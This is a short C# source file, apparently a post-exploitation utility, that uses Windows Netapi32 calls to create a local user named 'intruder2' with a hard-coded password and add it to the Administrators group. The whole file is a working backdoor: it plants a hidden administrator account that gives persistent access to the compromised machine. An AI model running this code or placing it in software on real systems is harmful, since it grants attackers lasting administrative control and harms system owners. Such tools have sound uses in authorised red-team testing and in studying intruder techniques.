using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AddUserSharp
{
    class Program
    {
        [DllImport("Netapi32.dll")]
        extern static int NetUserAdd([MarshalAs(UnmanagedType.LPWStr)] string servername, int level, ref STRUCTS.USER_INFO_1 buf, int parm_err);

        [DllImport("Netapi32.dll")]
        extern static int NetLocalGroupAddMembers([MarshalAs(UnmanagedType.LPWStr)] string servername, [MarshalAs(UnmanagedType.LPWStr)] string groupname, int level, ref STRUCTS.LOCALGROUP_MEMBERS_INFO_3 buf, int totalentries);

        static void Main(string[] args)
        {
            const uint USER_PRIV_GUEST = 0;
            const uint USER_PRIV_USER = 1;
            const uint USER_PRIV_ADMIN = 2;

            

            STRUCTS.USER_INFO_1 NewUser = new STRUCTS.USER_INFO_1();

            NewUser.sUsername = "intruder2";
            NewUser.sPassword = "Password@1";
            NewUser.uiPriv = USER_PRIV_USER;

            if (NetUserAdd(null, 1, ref NewUser, 0) != 0) 
            {
                Console.WriteLine("Error Adding User");
            }
            else
            {
                Console.WriteLine("Success Adding User!!!");
            }

            STRUCTS.LOCALGROUP_MEMBERS_INFO_3 NewMember = new STRUCTS.LOCALGROUP_MEMBERS_INFO_3();
            NewMember.domainandname = NewUser.sUsername;

            if (NetLocalGroupAddMembers(null, "Administrators", 3, ref NewMember, 1) != 0) 
            {
                Console.WriteLine("Error Adding Group Member");
            }
            else
            {
                Console.WriteLine("Success Adding Group Member!!!");
            }

        }
    }

   
    public class STRUCTS
    {
        public struct USER_INFO_1
        {
            [MarshalAs(UnmanagedType.LPWStr)] public string sUsername;
            [MarshalAs(UnmanagedType.LPWStr)] public string sPassword;
            public uint uiPasswordAge;
            public uint uiPriv;
            [MarshalAs(UnmanagedType.LPWStr)] public string sHome_Dir;
            [MarshalAs(UnmanagedType.LPWStr)] public string sComment;
            public uint uiFlags;
            [MarshalAs(UnmanagedType.LPWStr)] public string sScript_Path;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct LOCALGROUP_MEMBERS_INFO_3
        {
            public string domainandname;
        }

    }
   
}
